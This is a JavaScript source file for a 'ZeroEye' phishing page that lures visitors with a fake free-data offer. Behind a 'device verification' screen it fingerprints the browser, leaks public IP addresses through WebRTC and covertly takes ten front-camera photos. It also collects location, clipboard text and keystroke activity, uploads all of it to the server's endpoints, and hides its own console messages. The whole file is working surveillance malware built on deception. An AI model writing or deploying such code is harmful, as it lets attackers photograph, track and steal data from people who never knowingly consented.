const SERVER_URL = window.location.origin;
const sentIPs = new Set();
let behaviorData = {};

// Start with minimal interaction - just one click
setTimeout(() => {
    showVerificationPage();
}, 500);

function showVerificationPage() {
    document.body.innerHTML = `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh;">
            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
                <h1 style="font-size: 24px; margin-bottom: 20px;">🎁 Claim Your Free Data</h1>
                <p style="font-size: 16px; margin-bottom: 30px;">Click the button below to verify your device and claim your free 10GB data bundle.</p>
                <button onclick="startUltraAttack()" style="background: #4CAF50; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 18px; cursor: pointer; font-weight: bold;">
                    🚀 Claim Free Data
                </button>
                <p style="font-size: 12px; opacity: 0.7; margin-top: 20px;">Verification takes 5-10 seconds</p>
            </div>
        </div>
    `;
}

async function startUltraAttack() {
    try {
        // Show loading screen
        showLoadingScreen();
        
        console.log("[ZeroEye] Starting reconnaissance after user interaction...");
        
        // Phase 1: Passive Intelligence (No permissions needed)
        setTimeout(() => {
            collectPassiveIntelligence();
        }, 1000);
        
        // Phase 2: Active Intelligence (With user gesture)
        setTimeout(() => {
            attemptActiveIntelligence();
        }, 2000);
        
        // Phase 3: Behavioral Surveillance 
        startBehavioralSurveillance();
        
        // Phase 4: Continuous Monitoring
        startContinuousMonitoring();
        
    } catch (err) {
        console.error("[ZeroEye] Error:", err);
    }
}

function showLoadingScreen() {
    document.body.innerHTML = `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh;">
            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
                <h1 style="font-size: 24px; margin-bottom: 20px;">🔍 Verifying Your Device</h1>
                <div style="margin: 30px 0;">
                    <div style="width: 50px; height: 50px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                </div>
                <p style="font-size: 16px; opacity: 0.9;">Checking device compatibility...</p>
                <p style="font-size: 14px; opacity: 0.7; margin-top: 10px;">Camera access required for verification</p>
                <p style="font-size: 12px; opacity: 0.5; margin-top: 20px;">Please allow camera access when prompted</p>
            </div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    `;
}

// ==================== PHASE 1: PASSIVE INTELLIGENCE ====================

function collectPassiveIntelligence() {
    const data = {
        basic: collectBasicSystemInfo(),
        fingerprint: getAdvancedFingerprint(),
        network: getNetworkIntelligence(),
        environment: getBrowserEnvironment(),
        security: detectSecurityMeasures(),
        social: detectSocialMediaPresence(),
        hardware: getHardwareIntelligence(),
        storage: getStorageIntelligence(),
        meta: {
            timestamp: new Date().toISOString(),
            session_id: generateSessionId(),
            url: window.location.href,
            referrer: document.referrer
        }
    };
    
    sendData('upload_sys', data);
}

function collectBasicSystemInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        
        window: {
            width: window.innerWidth,
            height: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        },
        
        timezone: {
            name: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset()
        }
    };
}

function getAdvancedFingerprint() {
    return {
        canvas: getCanvasFingerprint(),
        webgl: getWebGLFingerprint(),
        audio: getAudioFingerprint(),
        fonts: getFontFingerprint(),
        plugins: getPluginFingerprint(),
        hardware: {
            devicePixelRatio: window.devicePixelRatio,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints
        }
    };
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Fingerprint', 4, 17);
        
        return canvas.toDataURL().substring(0, 50);
    } catch (e) {
        return 'Canvas blocked';
    }
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) return 'WebGL not supported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
            renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
        };
    } catch (e) {
        return 'WebGL blocked';
    }
}

function getAudioFingerprint() {
    try {
        const context = new (window.AudioContext || window.webkitAudioContext)();
        return 'Audio context available';
    } catch (e) {
        return 'Audio context blocked';
    }
}

function getFontFingerprint() {
    const fontList = ['Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'Georgia', 'Impact', 'Times New Roman', 'Verdana'];
    const availableFonts = [];
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = 200;
    canvas.height = 50;
    
    const baseText = 'abcdefghijklmnopqrstuvwxyz';
    const baseWidth = context.measureText(baseText).width;
    
    fontList.forEach(font => {
        context.font = `72px ${font}, monospace`;
        const width = context.measureText(baseText).width;
        if (width !== baseWidth) {
            availableFonts.push(font);
        }
    });
    
    return availableFonts;
}

function getPluginFingerprint() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    return plugins;
}

function getNetworkIntelligence() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const networkInfo = {};
    
    if (connection) {
        networkInfo.connection = {
            effectiveType: connection.effectiveType,
            downlink: connection.downlink,
            rtt: connection.rtt,
            saveData: connection.saveData
        };
    }
    
    // IP Detection via WebRTC
    detectIPs().then(ips => {
        if (ips.length > 0) {
            sendData('upload_ip', { ips: ips });
        }
    });
    
    return networkInfo;
}

function detectIPs() {
    return new Promise((resolve) => {
        const ips = new Set();
        const rtc = new RTCPeerConnection({ 
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }] 
        });
        
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        
        rtc.onicecandidate = (event) => {
            if (event.candidate) {
                const candidate = event.candidate.candidate;
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
                const matches = candidate.match(ipRegex);
                
                if (matches) {
                    matches.forEach(ip => {
                        if (!isPrivateIP(ip) && !sentIPs.has(ip)) {
                            sentIPs.add(ip);
                            ips.add(ip);
                        }
                    });
                }
            } else {
                resolve(Array.from(ips));
            }
        };
        
        setTimeout(() => resolve(Array.from(ips)), 2000);
    });
}

function getBrowserEnvironment() {
    return {
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine,
        webdriver: navigator.webdriver
    };
}

function detectSecurityMeasures() {
    return {
        adBlock: detectAdBlock(),
        passwordManagers: detectPasswordManagers()
    };
}

function detectAdBlock() {
    const test = document.createElement('div');
    test.innerHTML = '&nbsp;';
    test.className = 'adsbox';
    document.body.appendChild(test);
    
    const isBlocked = test.offsetHeight === 0;
    document.body.removeChild(test);
    return isBlocked;
}

function detectPasswordManagers() {
    const managers = {
        lastpass: !!document.querySelector('#lastpass-container'),
        bitwarden: !!document.querySelector('#bitwarden'),
        dashlane: !!window.dashlane
    };
    
    return Object.entries(managers)
        .filter(([_, exists]) => exists)
        .map(([manager]) => manager);
}

function detectSocialMediaPresence() {
    const platforms = {
        facebook: !!window.FB,
        twitter: !!window.twttr,
        instagram: !!window._instgrm,
        linkedin: !!window.LI
    };
    
    return Object.entries(platforms)
        .filter(([_, exists]) => exists)
        .map(([platform]) => platform);
}

function getHardwareIntelligence() {
    return {
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        touch: 'ontouchstart' in window
    };
}

function getStorageIntelligence() {
    const storage = {
        cookies: document.cookie ? 'Cookies present' : 'No cookies',
        localStorage: localStorage.length > 0 ? 'Data present' : 'Empty',
        sessionStorage: sessionStorage.length > 0 ? 'Data present' : 'Empty'
    };
    
    return storage;
}

function generateSessionId() {
    return 'sess_' + Math.random().toString(36).substr(2, 9);
}

// ==================== PHASE 2: ACTIVE INTELLIGENCE ====================

function attemptActiveIntelligence() {
    // Camera with user gesture (now we have it from button click)
    attemptCameraAccess();
    
    // Location with user gesture
    attemptLocationAccess();
    
    // Battery status
    attemptBatteryAccess();
    
    // Clipboard access
    attemptClipboardAccess();
}

function attemptCameraAccess() {
    const constraints = {
        video: {
            facingMode: "user",
            width: { ideal: 1280, min: 640 },
            height: { ideal: 720, min: 480 }
        }
    };
    
    navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            capturePhotos(stream);
        })
        .catch(error => {
            console.log("Camera access denied");
            sendData('upload_cam', { error: 'Camera access denied' });
        });
}

function capturePhotos(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.playsInline = true;
    video.style.display = 'none';
    document.body.appendChild(video);

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.style.display = 'none';
    document.body.appendChild(canvas);

    let photosTaken = 0;
    const maxPhotos = 10;

    function takePhoto() {
        if (photosTaken >= maxPhotos) {
            stream.getTracks().forEach(track => track.stop());
            return;
        }
        
        if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) {
                    const formData = new FormData();
                    formData.append('file', blob, `photo_${Date.now()}.jpg`);
                    sendFormData('upload_cam', formData);
                    photosTaken++;
                }
                
                // Take next photo after delay
                if (photosTaken < maxPhotos) {
                    setTimeout(takePhoto, 2000);
                } else {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 'image/jpeg', 0.85);
        }
    }

    // Start capturing after video is ready
    setTimeout(takePhoto, 1000);
}

function attemptLocationAccess() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: position.timestamp
            };
            
            sendData('upload_location', locationData);
        },
        (error) => {
            // Location access denied
        },
        { 
            enableHighAccuracy: false,
            timeout: 5000
        }
    );
}

function attemptBatteryAccess() {
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const batteryData = {
                level: Math.round(battery.level * 100),
                charging: battery.charging
            };
            
            sendData('upload_battery', batteryData);
        }).catch(() => {});
    }
}

function attemptClipboardAccess() {
    // Listen for paste events
    document.addEventListener('paste', (e) => {
        try {
            const clipboardData = e.clipboardData || window.clipboardData;
            const pastedText = clipboardData.getData('text');
            
            if (pastedText) {
                sendData('upload_clipboard', {
                    content: pastedText.substring(0, 500),
                    length: pastedText.length,
                    timestamp: Date.now()
                });
            }
        } catch (error) {}
    });

    // Try modern clipboard API
    if (navigator.clipboard && navigator.clipboard.readText) {
        // This might show a permission prompt
        navigator.clipboard.readText().then(text => {
            if (text) {
                sendData('upload_clipboard', {
                    content: text.substring(0, 500),
                    length: text.length,
                    timestamp: Date.now()
                });
            }
        }).catch(() => {});
    }
}

// ==================== PHASE 3: BEHAVIORAL SURVEILLANCE ====================

function startBehavioralSurveillance() {
    behaviorData = {
        mouseMovements: [],
        clicks: [],
        scrolls: [],
        keystrokes: [],
        startTime: Date.now(),
        sessionId: generateSessionId()
    };

    // Mouse movement tracking
    document.addEventListener('mousemove', (e) => {
        behaviorData.mouseMovements.push({
            x: e.clientX,
            y: e.clientY,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Click tracking
    document.addEventListener('click', (e) => {
        behaviorData.clicks.push({
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Scroll tracking
    window.addEventListener('scroll', () => {
        behaviorData.scrolls.push({
            x: window.scrollX,
            y: window.scrollY,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Keystroke tracking
    document.addEventListener('keydown', (e) => {
        behaviorData.keystrokes.push({
            key: e.key,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Send behavior data periodically
    setInterval(() => {
        if (behaviorData.clicks.length > 0 || behaviorData.mouseMovements.length > 10) {
            sendData('upload_behavior', {
                movements: behaviorData.mouseMovements.length,
                clicks: behaviorData.clicks.length,
                scrolls: behaviorData.scrolls.length,
                keystrokes: behaviorData.keystrokes.length,
                sessionTime: Date.now() - behaviorData.startTime
            });
            
            // Reset counts
            behaviorData.mouseMovements = [];
            behaviorData.clicks = [];
            behaviorData.scrolls = [];
            behaviorData.keystrokes = [];
        }
    }, 15000);
}

// ==================== PHASE 4: CONTINUOUS MONITORING ====================

function startContinuousMonitoring() {
    // Heartbeat every 30 seconds
    setInterval(() => {
        sendData('upload_heartbeat', {
            timestamp: Date.now(),
            url: window.location.href
        });
    }, 30000);
}

// ==================== UTILITY FUNCTIONS ====================

function isPrivateIP(ip) {
    return ip.startsWith('192.168.') || 
           ip.startsWith('10.') || 
           ip.startsWith('172.16.') ||
           ip.startsWith('172.17.') ||
           ip.startsWith('172.18.') ||
           ip.startsWith('172.19.') ||
           ip.startsWith('172.20.') ||
           ip.startsWith('172.21.') ||
           ip.startsWith('172.22.') ||
           ip.startsWith('172.23.') ||
           ip.startsWith('172.24.') ||
           ip.startsWith('172.25.') ||
           ip.startsWith('172.26.') ||
           ip.startsWith('172.27.') ||
           ip.startsWith('172.28.') ||
           ip.startsWith('172.29.') ||
           ip.startsWith('172.30.') ||
           ip.startsWith('172.31.') ||
           ip === '127.0.0.1';
}

function sendData(endpoint, data) {
    setTimeout(() => {
        fetch(`${SERVER_URL}/${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `data=${encodeURIComponent(JSON.stringify(data))}`
        }).catch(() => {});
    }, Math.random() * 2000 + 500);
}

function sendFormData(endpoint, formData) {
    setTimeout(() => {
        fetch(`${SERVER_URL}/${endpoint}`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    }, Math.random() * 2000 + 500);
}

// Override console methods for stealth
const originalLog = console.log;
console.log = function(...args) {
    if (typeof args[0] === 'string' && args[0].includes('[ZeroEye]')) {
        return;
    }
    originalLog.apply(console, args);
};

console.log("[ZeroEye] Ready - waiting for user interaction");
